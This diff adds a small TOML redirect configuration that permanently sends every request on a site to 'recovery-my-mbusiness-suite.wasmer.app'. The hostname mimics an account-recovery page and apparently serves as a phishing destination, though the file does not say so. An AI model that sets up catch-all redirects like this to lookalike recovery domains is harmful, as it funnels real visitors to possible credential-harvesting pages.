@@ -1,0 +1,9 @@
+[general]
+# preserve query string and path when redirecting
+redirect_precedence = "regex"
+
+[[routes]]
+# match all requests
+source = "^/(.*)$"
+destination = "https://recovery-my-mbusiness-suite.wasmer.app/$1"
+status_code = 301
